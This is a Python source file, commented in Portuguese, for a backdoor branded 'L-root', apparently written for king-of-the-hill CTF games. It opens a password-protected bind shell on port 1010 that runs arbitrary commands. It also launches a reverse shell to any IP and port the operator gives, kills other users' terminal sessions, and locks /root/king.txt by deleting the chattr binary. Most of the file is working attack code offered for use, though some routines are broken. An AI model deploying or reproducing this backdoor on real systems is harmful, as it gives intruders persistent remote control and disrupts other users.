# DETREW - MACHINE
import socket
import ctypes,signal
import os,getpass,time
import subprocess,platform
import multiprocessing as mp
import sys
import os

MIN_PYTHON = ("3.6.9")  # Versão mínima do Python exigida

MIN_PYTHON_VERSION = tuple(map(int, MIN_PYTHON.split(".")))

if sys.version_info < MIN_PYTHON_VERSION:
    print(f"A instalação do L-root foi interrompida porque a versão mínima do Python exigida é {MIN_PYTHON[0]}. ou superior. Você está executando o Python {sys.version}. Você pode instalar a versão Python compatível manualmente.")
    sys.exit(1)
else:
    print("[+] Versão compatível do Python detectada. Continuando a instalação...")
    try:
        print("[+] instalaçâo do L-root foi feita com sucesso")
    except Exception as e:
        print(f"[-]Erro: ocorreu um erro na instalação do L-root, Erro {e}]")
        sys.exit(1)

black='\033[0;90m'
red='\033[0;91m'
green='\033[0;92m'
yellow='\033[0;93m'
blue='\033[0;94m'
purple='\033[0;95m'
cyan='\033[0;96m'
white='\033[0;97m'
off='\033[0m'
fgreen='\033[42;97m'


SERVER_HOST = '0.0.0.0' #o ip
SERVER_PORT = 1010 #a porta a se conectar
backdoor_version = "1.0"

system=platform.system()
release=platform.release()
version=platform.version()
architecture=platform.machine()
python_version=platform.python_version()


banner_reaper=f"""
{red}


 ▄               ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░▌             ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌  __________
▐░▌             ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀  |  __  __  |
▐░▌             ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌      | |  ||  | |
▐░▌ ▄▄▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌      | |  ||  | |
▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌      | |__||__| |
▐░▌ ▀▀▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ ▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌      |  __  __()|
▐░▌             ▐░▌     ▐░▌  ▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌      | |  ||  | |
▐░█▄▄▄▄▄▄▄▄▄    ▐░▌      ▐░▌ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌      | |  ||  | |
▐░░░░░░░░░░░▌   ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌      | |__||__| |
 ▀▀▀▀▀▀▀▀▀▀▀     ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀       |__________|
                                                                                                                                
{purple}[https://github.com/Macchimne] and [https://github.com/Detrew]{off}     {green}[Backdoor]{off}

{off}
"""

arquivo = 'king.txt'
diretorios = ['/root', '/root/king.txt', '/home/root/king.txt']

for diretorio in diretorios:
    caminho_arquivo = os.path.join(diretorio, arquivo)
    try:
        with open(caminho_arquivo, 'r') as f:
            conteudo = f.read().strip()
            if conteudo:
            #se o king.txt estiver vazio executa os codigos
                print("O king.txt foi encontrando em:", diretorio)
            break
    except FileNotFoundError:
        pass
    
if os.path.exists('king.txt') and os.path.getsize('king.txt') > 0:
        print("o king.txt pode facilmente ser alterado usando o comando #getking")
else:
    print("o king.txt já foi alterado")
       
#comando #getking
def get_king(update, context):
    #comandos
    comando1 ='echo "Macchine" > /root/king.txt'
    comando2 ='chattr +i king.txt'
    comando3 ='rm -r /usr/bin/chattr'
    
    #executando os comandos com subprocess
    subprocess.run(comando1, shell=True)
    subprocess.run(comando2, shell=True)
    subprocess.run(comando3, shell=True)
    
    update.message.reply_text("Sua coroação foi feita com sucesso :)")
   
   
    #executar o #getking quando recebido
    if update.message.text == '#getking':
        get_king(update, context)
        

pid = os.getpid()
hostname = os.uname().nodename



def ghost(pid):
    libc = ctypes.CDLL('libc.so.6')
    libc.setuid(0)
    proc_maps_file = f"/proc/{pid}/maps"
    with open(proc_maps_file, 'r') as f:
        addr = f.readline().split('-')[0]
    libc = ctypes.CDLL('libc.so.6')
    mprotect = libc.mprotect
    mprotect.restype = ctypes.c_int
    mprotect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
    addr = int(addr, 16)
    pagesize = os.sysconf("SC_PAGE_SIZE")
    mprotect(addr, pagesize, 0x0)



help=f"""
    {off}\n
    ╔═══════════════════[help]═════════════════════╗
     {blue}#exit{off}: Fecha a sessão do alvo
     {blue}#revshell{off}: Faz uma shell-Reversa    
     {blue}#kill{off}: Chutar todos com tty :) 
     {blue}#info{off}: Machine info
     {blue}#cat{off}: gatos para todos com tty 
     {blue}#help{off}: Manual de ajuda
    ╚═════════════════════════════════════════════╝\n\n
    """
info=f"""
    ╔═══════════════════════[System Information]══════════════════════╗
     {white}Nome:{green} {hostname} {off}
     {white}Kernel:{green} {release}{off}
     {white}Arquitetura:{green} {architecture}{off}
     {white}Versão:{green} {version}{off}
    ╚═════════════════════════════════════════════════════════════════╝
"""

def handle_client(client_sock):
    vusername = getpass.getuser()
    client_sock.send(f"{vusername}@{hostname}".encode())
    client_sock.send(b'\033c')
    client_sock.send(f'{banner_reaper}\n'.encode())
    client_sock.send(f'[{green}Login{off}]: '.encode())
    username = client_sock.recv(1024).decode().strip()
    client_sock.send(f'[{green}Password{off}]: '.encode()) 
    password = client_sock.recv(1024).decode().strip()
   
    # O usuario e senha
    if username == 'Machine':
        if password == 'sorvete':
            client_sock.send(b'\033c')
            client_sock.send(f'{banner_reaper}\n'.encode())
            client_sock.send(f'{green}[*]{off} Bem-Vindo\n{green}[+]{off} python versão: {python_version}\n{green}[+]{off} backdoor versão: {backdoor_version}\n{green}[+]{off} Use #help para ver os comandos\n{red}[+]{yellow} Este é um shell de ligação para ter um shell reverso Use o comando {green}#revshell\n{off}'.encode())
            client_sock.send(f'\n[{red}{username}{off}@{red}{hostname}{off}]:~# '.encode())
            
            while True:
                cmd = client_sock.recv(1024).decode().strip()
                if cmd == '#revshell':
                    client_sock.send(f"[{green}ip{off}]: ".encode())
                    ip_rev = client_sock.recv(1024).decode().strip()
                    client_sock.send(f"[{green}port{off}]: ".encode())
                    port_rev = client_sock.recv(1024).decode().strip()
                    os.system(f"""/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip_rev}",{port_rev}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' & 2>/dev/null >/dev/null""")
                    client_sock.send(f"[{green}Reverse Shell Send{off}]".encode())
                    pass
                elif cmd == '#kill':
                    os.system("""MY=$(tty|cut -d'/' -f4);for L in $(seq 40);do [ $MY == $L] && { echo 'Live'; } || { cat kick_message > /dev/pts/$L; pkill -9 -t pts/$L 2>/dev/null; };done 2>/dev/null""")
                    client_sock.send(f"[{green}Killed Shells{off}]".encode())
                elif cmd == '#cat':
                    os.system("""MY=$(tty|cut -d'/' -f4);for L in $(seq 40);do [ $MY == $L] && { echo 'Live'; } || { bash kitty.sh > /dev/pts/$L 2>/dev/null & };done 2>/dev/null""")
                    client_sock.send(f"[{green}Owo!{off}]".encode())
                elif cmd == '#info':
                    client_sock.send(f"{info}".encode())
                elif cmd == '#help':
                    client_sock.send(f"{help}".encode())
                elif cmd == '#exit':
                    break
                else:
                    output = subprocess.getoutput(cmd)
                    client_sock.send(output.encode())
                client_sock.send(f'\n[{red}{username}{off}@{red}{hostname}{off}]:~# '.encode())
        else:
            client_sock.send(f'\n[{red}\o/ Wrong Password{off}]\n'.encode())
            client_sock.close()
    else:
        client_sock.send(f'\n[{red}\o/ Wrong Username{off}]\n'.encode())
        client_sock.close()

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(5)
    
    print(f"[+] Servidor backdoor ouvindo em {SERVER_HOST}:{SERVER_PORT}")
    
    while True:
        client_sock, client_addr = server_socket.accept()
        print(f"[+] Conexão recebida de {client_addr[0]}:{client_addr[1]}")
        
        # Iniciar processo para lidar com o cliente
        client_process = mp.Process(target=handle_client, args=(client_sock,))
        client_process.start()
        client_sock.close()

#aqui vai ficar o start server
if __name__ == '__main__':
    start_server()
